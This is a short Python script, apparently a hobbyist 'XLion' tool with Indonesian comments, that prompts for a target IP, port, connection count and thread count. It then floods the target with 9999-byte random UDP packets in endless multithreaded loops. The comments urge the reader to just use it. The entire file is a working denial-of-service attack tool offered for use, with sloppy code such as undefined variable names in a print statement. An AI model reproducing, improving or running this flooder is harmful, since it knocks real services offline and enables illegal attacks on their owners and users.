#!/usr/bin/env python3
#bukan grabber tod udah gw remake
#pake aja
import os
import sys
import socket
import time
import random
import threading

print("""
\u001b[31m
Author : XLion
""")
print("""
\u001b[31m
Team : XLion
""")
print("""\u001b[31m
Note : bukan grabber noh cek aja file nya
""")
#XLion ama XLionport ganti aja ntar juga error awokwl
XLion = str(input("   \u001b[31m \u001b[37mIp/Host :\u001b[31m  "))
time.sleep(3)
print(" ")
XLionport = int(input("   \u001b[31m \u001b[37mPort Server :\u001b[31m  "))
print(" ")
paket = int(input("   \u001b[31m \u001b[37mConnections :\u001b[31m  "))
print(" ")
threads = int(input("   \u001b[31m \u001b[37mThreading :\u001b[31m  "))
time.sleep(3)

# Attack
def xn():
	data = random._urandom(9999)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(XLion),int(XLionport))
			for x in range(paket):
				s.sendto(data,addr)
			print(f"\u001b[33mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
		except:
			print(f"\u001b[33mAttack To Ip \u001b[37m{XLion} \u001b[31mOn Port \u001b[37m{XLionport}")

# Threads
for y in range(threads):
	xn = threading.Thread(target = xn)
	xn.start()